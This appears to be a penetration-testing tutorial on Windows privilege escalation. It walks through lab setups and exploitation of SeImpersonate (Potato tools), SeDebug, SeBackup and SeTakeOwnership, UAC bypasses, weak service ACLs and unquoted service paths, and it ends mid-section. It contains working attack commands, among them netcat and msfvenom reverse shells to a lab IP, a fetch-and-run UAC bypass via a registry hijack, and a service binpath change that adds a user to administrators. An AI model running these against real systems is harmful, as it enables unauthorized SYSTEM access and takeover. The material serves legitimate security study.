# Windows Privilege Escalation

## Toolkit&#x20;

<table data-search="false"><thead><tr><th width="165.20001220703125">Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td><td>C# project for performing a wide variety of local privilege escalation checks</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></td><td>WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained <a href="https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html">here</a></td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></td><td>PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp">SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS">JAWS</a></td><td>PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></td><td>SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson">Watson</a></td><td>Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></td><td>Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation</a></td><td>WES-NG is a tool based on the output of Windows' <code>systeminfo</code> utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></td><td>We will use several tools from Sysinternals in our enumeration including <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>, and <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a></td></tr></tbody></table>

We can also find pre-compiled binaries of `Seatbelt` and `SharpUp` [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), and standalone binaries of `LaZagne` [here](https://github.com/AlessandroZ/LaZagne/releases/). It is recommended that we always compile our tools from the source if using them in a client environment.

{% hint style="info" %}
**Note**_**:**_

&#x20;_Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to `C:\Windows\Temp` because the `BUILTIN\Users` group has write access._
{% endhint %}

## Abusing SeImpersonate Privilege&#x20;

<details>

<summary><strong>Creating the vulnerable Environment</strong></summary>

## Create user&#x20;

{% code overflow="wrap" %}
```cmd
net user <username> <password> /add
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1874).png" alt=""><figcaption></figcaption></figure>

## Assign Privileges

{% code overflow="wrap" %}
```
Win + R
→ secpol.msc
→ Local Policies
→ User Rights Assignment
→ Impersonate a client after authentication
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1875).png" alt=""><figcaption></figcaption></figure>

## Verify&#x20;

Open the cmd with administrator in `esc_priv_user` and check permissions.&#x20;

<figure><img src="../../.gitbook/assets/image (1876).png" alt=""><figcaption></figcaption></figure>

</details>

SeImpersonatePrivilege is a Windows privilege that allows a process to **impersonate the security token of another account** that connects to it. It is granted by default to service accounts like those running **IIS and SQL Server**, which is exactly why it is the most common Windows escalation path: an attacker who lands as such a service account uses a **Potato attack** to trick a SYSTEM process into authenticating, captures its token, and becomes **SYSTEM**. The first check on any Windows host is `whoami /priv`.

### Check Privilege&#x20;

{% code overflow="wrap" %}
```
whoami /priv
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1878).png" alt=""><figcaption></figcaption></figure>

### Using PrintSpoofer.exe

{% code overflow="wrap" %}
```cmd
.\PrintSpoofer64.exe -c "C:\Tools\nc.exe 192.168.16.138 9090 -e cmd"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1877).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1879).png" alt=""><figcaption></figcaption></figure>

### &#x20;Using GodPotato&#x20;

{% code overflow="wrap" %}
```cmd
.\GodPotato-Net4.exe -cmd "cmd /c C:\Tools\nc.exe 192.168.16.138 9000 -e cmd"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1880).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1881).png" alt=""><figcaption></figcaption></figure>

### Using SigmaPotato.exe&#x20;

{% code overflow="wrap" %}
```cmd
.\SigmaPotato.exe --revshell 192.168.16.138 9000
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1882).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1883).png" alt=""><figcaption></figcaption></figure>

### Using JuicyPotatoNG.exe&#x20;

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.138 LPORT=4545 -f exe -o shell.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1884).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
JuicyPotatoNG.exe -t * -p C:\Users\esc_priv_user\Downloads\shell.exe -l 4545
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1885).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1886).png" alt=""><figcaption></figcaption></figure>

## Abusing SeDebugPrivilege Privilege

<details>

<summary><strong>Create the vulnerable environment</strong></summary>

This privilege can be assigned via local or domain group policy, under `Local Security Policy > Security Settings > User right Assignments > Debug Program > Add user`.&#x20;

<figure><img src="../../.gitbook/assets/image (1887).png" alt=""><figcaption></figcaption></figure>



</details>

To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.

{% hint style="info" %}
_By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job._
{% endhint %}

### Identify Privileges&#x20;

{% code overflow="wrap" %}
```cmd
whoami /priv
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1888).png" alt=""><figcaption></figcaption></figure>

### Identify the parent process PID

{% hint style="info" %}
_We target `winlogon.exe` because it normally runs as **SYSTEM**, making it a suitable privileged parent process for a `SeDebugPrivilege`-based escalation._
{% endhint %}

{% code overflow="wrap" %}
```cmd
tasklist /v | findstr "winlogon.exe"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1889).png" alt=""><figcaption></figcaption></figure>

### Escalate Privileges&#x20;

Download tool [here](https://github.com/decoder-it/psgetsystem).&#x20;

<figure><img src="../../.gitbook/assets/image (1890).png" alt=""><figcaption></figcaption></figure>

## Unauthorized File Read/Write

### Using SeTakeOwnership Privileges (Write)

_SeTakeOwnership allows a user to take ownership of securable objects such as files, folders, registry keys, services, etc. After becoming the owner, you may need to modify the ACL to actually access the object._

#### Identify Privileges&#x20;

{% code overflow="wrap" %}
```
whoami /priv
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1893).png" alt=""><figcaption></figcaption></figure>

#### Take Ownership

After taking the ownership the file can even be modified as well.&#x20;

```
takeown /f <file>
icacls <file> /grant <our user>:F
type <file>
```

<figure><img src="../../.gitbook/assets/image (1894).png" alt=""><figcaption></figcaption></figure>

### Using SeBackupPrivilege (Read)

#### Check Our Privileges&#x20;

{% code overflow="wrap" %}
```cmd
whoami /groups
whoami /priv
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1897).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1896).png" alt=""><figcaption></figcaption></figure>

#### Enable SeBackupPrivilege

{% code overflow="wrap" %}
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1898).png" alt=""><figcaption></figcaption></figure>

#### Access Unauthorized Files&#x20;

1. **Using SeBackupPrivilege DLLs**

{% code overflow="wrap" %}
```cmd
Copy-FileSeBackupPrivilege C:\Secret\imp.txt .\secretfile.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1899).png" alt=""><figcaption></figcaption></figure>

2. **Using robocopy**

{% code overflow="wrap" %}
```
robocopy /B C:\Secret .\ imp.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1900).png" alt=""><figcaption></figcaption></figure>

## Abusing UAC

### Confirming UAC is enabled&#x20;

{% code overflow="wrap" %}
```cmd
 REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1973).png" alt=""><figcaption></figcaption></figure>

### Checking UAC Level&#x20;

#### UAC Levels&#x20;

* **0 — Never notify:** UAC prompts are disabled; lowest security.
* **1 — Prompt for credentials on secure desktop:** Admin must enter credentials.
* **2 — Prompt for consent on secure desktop:** Admin must approve.
* **3 — Prompt for credentials:** Credentials required, but not on secure desktop.
* **4 — Prompt for consent:** Admin simply approves.
* **5 — Prompt for consent for non-Windows binaries:** Default; prompts when a non-Windows app requests elevation.

{% code overflow="wrap" %}
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1974).png" alt=""><figcaption></figcaption></figure>

### Automated Bypass with bypassuac\_fodhelper

{% hint style="warning" %}
_The user must be a member of the **Local Administrators** group on the Windows machine._
{% endhint %}

The Metasploit Module  `exploit/windows/local/bypassuac_fodhelper` abuses the Windows Features-On-Demand helper (fodhelper.exe). Because `fodhelper` auto-elevates and queries the per-user registry hive for its file-association command, an attacker who plants a custom command under HKCU\Software\Classes\ms-settings\Shell\Open\command achieves silent elevation when the binary launches.

{% code overflow="wrap" expandable="true" %}
```bash
use exploit/windows/local/bypassuac_fodhelper
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1975).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1976).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1977).png" alt=""><figcaption></figcaption></figure>

**Useful payloads**&#x20;

{% code overflow="wrap" expandable="true" %}
```
windows/shell_reverse_tcp
windows/shell_bind_tcp 
windows/meterpreter/reverse_https
windows/meterpreter/reverse_http
```
{% endcode %}

### Other Useful Metasploit Module&#x20;

{% code overflow="wrap" expandable="true" %}
```
windows/local/bypassuac_injection_winsxs
exploit/windows/local/bypassuac_sdclt
exploit/windows/local/bypassuac_silentcleanup
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1978).png" alt=""><figcaption></figcaption></figure>

### Manual UAC Bypass via ComputerDefaults.exe&#x20;

{% code overflow="wrap" expandable="true" %}
```
wget http://192.168.1.17/new.exe -o C:\Users\arjun\Desktop\new.exe
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Users\arjun\Desktop\new.exe" -force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1980).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1979).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1981).png" alt=""><figcaption></figcaption></figure>

### Manual UAC Bypass via msconfig&#x20;

right now we've this minimal privileges.&#x20;

<figure><img src="../../.gitbook/assets/image (1984).png" alt=""><figcaption></figcaption></figure>

Using `msconfig` ⇒ `Tools` ⇒ `Select Command Prompt` ⇒ `Launch`. Thus using msconfig utility we're able to execute elevated shell.

<figure><img src="../../.gitbook/assets/image (1982).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1983).png" alt=""><figcaption></figcaption></figure>

## Weak Permissions

### Abusing Modifiable Service Binaries (Weak Service-binary ACL)

<details>

<summary><strong>Create the vulnerable Environment</strong></summary>

## Create a service

Note that we've made this service with Administrator privileges.&#x20;

1. `New-Item -ItemType Directory -Path "C:\Program Files\VulnService" -Force`

<figure><img src="../../.gitbook/assets/image (1905).png" alt=""><figcaption></figcaption></figure>

2. Create legitimate-looking service.

{% code overflow="wrap" expandable="true" %}
```powershell
$code = @'
using System;
using System.IO;

class Program
{
    static void Main()
    {
        string dir = @"C:\ProgramData\VulnService";
        Directory.CreateDirectory(dir);

        string log = Path.Combine(dir, "maintenance.log");

        using (StreamWriter w = new StreamWriter(log, false))
        {
            w.WriteLine("========================================");
            w.WriteLine("      Windows System Maintenance");
            w.WriteLine("========================================");
            w.WriteLine("Computer Name    : " + Environment.MachineName);
            w.WriteLine("User Context     : " + Environment.UserName);
            w.WriteLine("User Domain      : " + Environment.UserDomainName);
            w.WriteLine("OS Version       : " + Environment.OSVersion);
            w.WriteLine("64-bit OS        : " + Environment.Is64BitOperatingSystem);
            w.WriteLine("Processor Count  : " + Environment.ProcessorCount);
            w.WriteLine("Windows Directory: " + Environment.GetEnvironmentVariable("WINDIR"));
            w.WriteLine("Program Files    : " + Environment.GetEnvironmentVariable("ProgramFiles"));
            w.WriteLine("Report Generated : " + DateTime.Now);
            w.WriteLine("========================================");
        }
    }
}
'@

Add-Type -TypeDefinition $code -OutputAssembly "C:\Program Files\VulnService\Service.exe"
```
{% endcode %}

3. Test the service&#x20;

{% code overflow="wrap" expandable="true" %}
```ps1
& "C:\Program Files\VulnService\Service.exe"
type C:\programData\VulnService\maintenance.log
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1906).png" alt=""><figcaption></figcaption></figure>

## Turn it into a Windows Service&#x20;

{% code overflow="wrap" expandable="true" %}
```ps
sc create VulnService binPath= "C:\Program Files\VulnService\Service.exe" start= auto obj= LocalSystem
```
{% endcode %}

* **`create VulnService`** → Creates a service named `VulnService`.
* **`binPath=`** → Specifies the executable the service will run.
* **`start= demand`** → Service starts **manually**, not automatically at boot.
* **`obj= LocalSystem`** → Service runs as the **LocalSystem account**, which has very high privileges.

<figure><img src="../../.gitbook/assets/image (1915).png" alt=""><figcaption></figcaption></figure>

## Give `esc_priv_user` full control over the binary

{% code overflow="wrap" expandable="true" %}
```powershell
icacls "C:\Program Files\VulnService\Service.exe" /grant esc_priv_user:F
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1908).png" alt=""><figcaption></figcaption></figure>

</details>

#### Manual Weak Service Binary ACL Discovery

1. **Enumerate all services**&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
wmic service get name,displayname,pathname,startname
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1910).png" alt=""><figcaption></figcaption></figure>

2. **Query individual service and identify its binary and Start type** &#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
sc.exe qc VulnService
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1913).png" alt=""><figcaption></figcaption></figure>

3. **Check the Executable ACL**&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
icacls <binary location>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1912).png" alt=""><figcaption></figcaption></figure>

#### Using Custom PowerShell Script to identify Weak Service Binary ACL

{% code overflow="wrap" expandable="true" %}
```ps1
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

# Current user + groups
$identities = @(
    $currentUser.Name
    $currentUser.Groups | ForEach-Object {
        try {
            $_.Translate([System.Security.Principal.NTAccount]).Value
        }
        catch {}
    }
)

Write-Host ""
Write-Host "Current User: $($currentUser.Name)"
Write-Host "Checking service executable ACLs..."
Write-Host ""

$services = Get-CimInstance Win32_Service

foreach ($service in $services) {

    $path = $service.PathName

    if ([string]::IsNullOrWhiteSpace($path)) {
        continue
    }

    # Extract executable path from quoted/unquoted service command line
    if ($path -match '^"([^"]+\.exe)"') {
        $exe = $matches[1]
    }
    elseif ($path -match '^(.+?\.exe)(?:\s|$)') {
        $exe = $matches[1]
    }
    else {
        continue
    }

    if (-not (Test-Path -LiteralPath $exe -PathType Leaf)) {
        continue
    }

    try {
        $acl = Get-Acl -LiteralPath $exe -ErrorAction Stop
    }
    catch {
        continue
    }

    $interesting = @()

    foreach ($rule in $acl.Access) {

        $identity = $rule.IdentityReference.Value

        # Only consider identities belonging to current user/groups
        if ($identities -contains $identity) {

            $rights = $rule.FileSystemRights.ToString()

            if ($rights -match 'FullControl|Modify|Write') {

                $interesting += [PSCustomObject]@{
                    Identity   = $identity
                    Rights     = $rights
                    AccessType = $rule.AccessControlType
                }
            }
        }
    }

    if ($interesting.Count -gt 0) {

        Write-Host "========================================"
        Write-Host "SERVICE : $($service.Name)"
        Write-Host "DISPLAY : $($service.DisplayName)"
        Write-Host "BINARY  : $exe"
        Write-Host "RUN AS  : $($service.StartName)"
        Write-Host ""

        $interesting | Format-Table -AutoSize

        Write-Host ""
    }
}
```
{% endcode %}

{% code overflow="wrap" expandable="true" %}
```powershell
.\Find-WeakServiceBinaries.ps1
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1909).png" alt=""><figcaption></figcaption></figure>

#### Escalating the privileges

<figure><img src="../../.gitbook/assets/image (1914).png" alt=""><figcaption></figcaption></figure>

### Abusing Modifiable Services (Weak Service ACL)

<details>

<summary><strong>Create the Vulnerable Environment</strong> </summary>

## Create Directories&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
New-Item -ItemType Directory -Path "C:\Program Files\AppTelemetry" -Force
New-Item -ItemType Directory -Path "C:\ProgramData\AppTelemetry" -Force
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1922).png" alt=""><figcaption></figcaption></figure>

## Build the service binaries&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
$source = @"
using System;
using System.ServiceProcess;
using System.IO;
using System.Threading;

public class AppTelemetryAgent : ServiceBase
{
    private Thread worker;
    private bool running = true;

    public AppTelemetryAgent()
    {
        this.ServiceName = "AppTelemetryAgent";
    }

    protected override void OnStart(string[] args)
    {
        Directory.CreateDirectory(@"C:\ProgramData\AppTelemetry");

        File.AppendAllText(
            @"C:\ProgramData\AppTelemetry\agent.log",
            DateTime.Now + " - Application Telemetry Agent started as " +
            Environment.UserName + Environment.NewLine
        );

        worker = new Thread(Work);
        worker.Start();
    }

    private void Work()
    {
        while (running)
        {
            File.AppendAllText(
                @"C:\ProgramData\AppTelemetry\agent.log",
                DateTime.Now + " - Telemetry collection cycle completed." +
                Environment.NewLine
            );

            Thread.Sleep(10000);
        }
    }

    protected override void OnStop()
    {
        running = false;

        File.AppendAllText(
            @"C:\ProgramData\AppTelemetry\agent.log",
            DateTime.Now + " - Application Telemetry Agent stopped." +
            Environment.NewLine
        );
    }

    public static void Main()
    {
        ServiceBase.Run(new AppTelemetryAgent());
    }
}
"@

Add-Type `
    -TypeDefinition $source `
    -Language CSharp `
    -OutputAssembly "C:\Program Files\AppTelemetry\AppTelemetryAgent.exe" `
    -OutputType ConsoleApplication `
    -ReferencedAssemblies "System.ServiceProcess.dll"
```
{% endcode %}

## Verify the binary is not writable&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
icacls "C:\Program Files\AppTelemetry\AppTelemetryAgent.exe"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1923).png" alt=""><figcaption></figcaption></figure>

## Create the service&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
sc.exe create AppTelemetryAgent binPath= "C:\Program Files\AppTelemetry\AppTelemetryAgent.exe" start= auto DisplayName= "Application Telemetry Agent"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1924).png" alt=""><figcaption></figcaption></figure>

## Make it vulnerable&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
$sid = (Get-LocalUser -Name "esc_priv_user").SID.Value; sc.exe sdset AppTelemetryAgent "D:(A;;CCLCSWRPWPDTLOCRRC;;;${sid})(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1925).png" alt=""><figcaption></figcaption></figure>

</details>

#### Manual Weak Service ACL Discovery&#x20;

1. **Enumerate all services**&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
wmic service get name,displayname,pathname,startname
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1921).png" alt=""><figcaption></figcaption></figure>

2. **Use** [**`accesschk.exe`**](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) **from sysinternals tools to identify ACL.**&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1920).png" alt=""><figcaption></figcaption></figure>

#### Using custom PowerShell script to identify Weak Services ACL

{% code overflow="wrap" expandable="true" %}
```ps1
# Find-ModifiableServices.ps1
# Identify services where the current user/groups have
# SERVICE_CHANGE_CONFIG, SERVICE_START, or SERVICE_STOP.
#
# A service is reported ONLY when SERVICE_CHANGE_CONFIG (DC)
# is present.

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

# ------------------------------------------------------------
# Current user + group memberships
# ------------------------------------------------------------

$identities = @(
    $currentUser.Name

    $currentUser.Groups | ForEach-Object {
        try {
            $_.Translate(
                [System.Security.Principal.NTAccount]
            ).Value
        }
        catch {}
    }
)

Write-Host ""
Write-Host "Current User : $($currentUser.Name)" -ForegroundColor Cyan
Write-Host "Checking service ACLs..." -ForegroundColor Cyan
Write-Host ""

# ------------------------------------------------------------
# Convert ONLY the three service rights we care about
# ------------------------------------------------------------

function Convert-ServiceRights {

    param (
        [string]$Rights
    )

    $ReadableRights = @()

    # DC = SERVICE_CHANGE_CONFIG
    if ($Rights -match 'DC') {
        $ReadableRights += "SERVICE_CHANGE_CONFIG"
    }

    # RP = SERVICE_START
    if ($Rights -match 'RP') {
        $ReadableRights += "SERVICE_START"
    }

    # WP = SERVICE_STOP
    if ($Rights -match 'WP') {
        $ReadableRights += "SERVICE_STOP"
    }

    if ($ReadableRights.Count -eq 0) {
        return "None"
    }

    return ($ReadableRights -join ", ")
}

# ------------------------------------------------------------
# Enumerate services
# ------------------------------------------------------------

$services = Get-CimInstance Win32_Service

foreach ($service in $services) {

    # --------------------------------------------------------
    # Get service security descriptor
    # --------------------------------------------------------

    $sd = sc.exe sdshow $service.Name 2>$null

    if (-not $sd) {
        continue
    }

    $sdText = ($sd -join " ")

    # --------------------------------------------------------
    # Extract ACEs
    # --------------------------------------------------------

    $aces = [regex]::Matches(
        $sdText,
        '\(([^)]+)\)'
    )

    $interesting = @()

    foreach ($aceMatch in $aces) {

        $ace = $aceMatch.Groups[1].Value

        # ACE:
        # Type;Flags;Rights;ObjectGuid;InheritObjectGuid;AccountSid

        $parts = $ace.Split(';')

        if ($parts.Count -lt 6) {
            continue
        }

        $aceType = $parts[0]
        $rights  = $parts[2]
        $sid     = $parts[5]

        # ----------------------------------------------------
        # Only Allow ACEs
        # ----------------------------------------------------

        if ($aceType -ne "A") {
            continue
        }

        # ----------------------------------------------------
        # Resolve SID -> Account
        # ----------------------------------------------------

        try {
            $account = (
                New-Object System.Security.Principal.SecurityIdentifier($sid)
            ).Translate(
                [System.Security.Principal.NTAccount]
            ).Value
        }
        catch {
            continue
        }

        # ----------------------------------------------------
        # Check current user/groups
        # ----------------------------------------------------

        if ($identities -notcontains $account) {
            continue
        }

        # ----------------------------------------------------
        # IMPORTANT:
        # Only DC makes the service interesting.
        #
        # RP/WP are displayed if they exist,
        # but are NOT enough to report the service.
        # ----------------------------------------------------

        if ($rights -match 'DC') {

            $interesting += [PSCustomObject]@{
                Identity = $account
                Rights   = Convert-ServiceRights $rights
            }
        }
    }

    # --------------------------------------------------------
    # Display service
    # --------------------------------------------------------

    if ($interesting.Count -gt 0) {

        Write-Host "============================================" `
            -ForegroundColor Yellow

        Write-Host "SERVICE : $($service.Name)" `
            -ForegroundColor Green

        Write-Host "DISPLAY : $($service.DisplayName)"
        Write-Host "STATE   : $($service.State)"
        Write-Host "RUN AS  : $($service.StartName)"
        Write-Host "BINARY  : $($service.PathName)"
        Write-Host ""

        Write-Host "Relevant Service Rights:" `
            -ForegroundColor Cyan

        $interesting |
            Select-Object Identity, Rights |
            Format-Table -AutoSize

        Write-Host ""
    }
}

Write-Host "Finished." -ForegroundColor Cyan
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1919).png" alt=""><figcaption></figcaption></figure>

#### Escalating Privileges&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
sc.exe config AppTelemetryAgent binpath="C:\Users\esc_priv_user\Desktop\shell.exe"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1918).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_Note that if exe is not allowed to execute or there is some firewall restrictions for connections we can make ourself admin using this command:_&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
sc config WindscribeService binpath="cmd /c net localgroup administrators esc_priv_user /add"
```
{% endcode %}
{% endhint %}

### Unquoted Service Paths&#x20;

#### How Windows resolves an unquoted command line

Suppose a program is launched with:

```
C:\Program Files\Microsoft Office\Office16\WINWORD.EXE
```

Windows doesn't simply assume the whole string is the executable. Because there are spaces, it has to determine **which part is the executable name**.

Conceptually, it tests possible executable boundaries from **left to right**:

```
1. C:\Program.exe
2. C:\Program Files\Microsoft.exe
3. C:\Program Files\Microsoft Office\Office16\WINWORD.exe
```

It checks whether each candidate actually exists/is executable. **It uses the first valid executable interpretation.**

So if only:

```
C:\Program Files\Microsoft Office\Office16\WINWORD.exe
```

exists, that's what gets executed.

<details>

<summary><strong>Create the vulnerable environment</strong></summary>

## Create Directories&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
New-Item -ItemType Directory -Path "C:\Program Files\DeviceTelemetry\Telemetry Agent" -Force
New-Item -ItemType Directory -Path "C:\ProgramData\DeviceTelemetry" -Force
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1926).png" alt=""><figcaption></figcaption></figure>

## Create legitimate Service Binary&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
$source = @"
using System;
using System.IO;
using System.ServiceProcess;
using System.Threading;

public class DeviceHealthMonitor : ServiceBase
{
    private Thread worker;
    private bool running = true;

    public DeviceHealthMonitor()
    {
        this.ServiceName = "DeviceTelemetryAgent";
    }

    protected override void OnStart(string[] args)
    {
        Directory.CreateDirectory(@"C:\ProgramData\DeviceTelemetry");

        File.AppendAllText(
            @"C:\ProgramData\DeviceTelemetry\telemetry.log",
            DateTime.Now +
            " - Device Telemetry Agent started as " +
            Environment.UserName +
            Environment.NewLine
        );

        worker = new Thread(CollectTelemetry);
        worker.Start();
    }

    private void CollectTelemetry()
    {
        while (running)
        {
            File.AppendAllText(
                @"C:\ProgramData\DeviceTelemetry\telemetry.log",
                DateTime.Now +
                " - Device health telemetry collected." +
                Environment.NewLine
            );

            Thread.Sleep(10000);
        }
    }

    protected override void OnStop()
    {
        running = false;

        File.AppendAllText(
            @"C:\ProgramData\DeviceTelemetry\telemetry.log",
            DateTime.Now +
            " - Device Telemetry Agent stopped." +
            Environment.NewLine
        );
    }

    public static void Main()
    {
        ServiceBase.Run(new DeviceHealthMonitor());
    }
}
"@

Add-Type `
    -TypeDefinition $source `
    -Language CSharp `
    -OutputAssembly "C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe" `
    -OutputType ConsoleApplication `
    -ReferencedAssemblies "System.ServiceProcess.dll"
```
{% endcode %}

## Create the service with the unquoted path&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
sc.exe create DeviceTelemetryAgent type= own start= auto binpath= "C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe" obj= LocalSystem displayname= "Device Telemetry Agent"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1928).png" alt=""><figcaption></figcaption></figure>

## Give Modify access to the parent directory&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
icacls "C:\Program Files\DeviceTelemetry" /grant:r "BAKASURA\esc_priv_user:(M)"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1932).png" alt=""><figcaption></figcaption></figure>

## Give Normal User start/stop access&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
$sid = (Get-LocalUser -Name "esc_priv_user").SID.Value
sc.exe sdset DeviceTelemetryAgent "D:(A;;CCLCRPWP;;;${sid})(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1933).png" alt=""><figcaption></figcaption></figure>



</details>

#### Searching for Unquoted Service paths&#x20;

{% tabs %}
{% tab title="CMD" %}
{% code overflow="wrap" expandable="true" %}
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
{% endcode %}

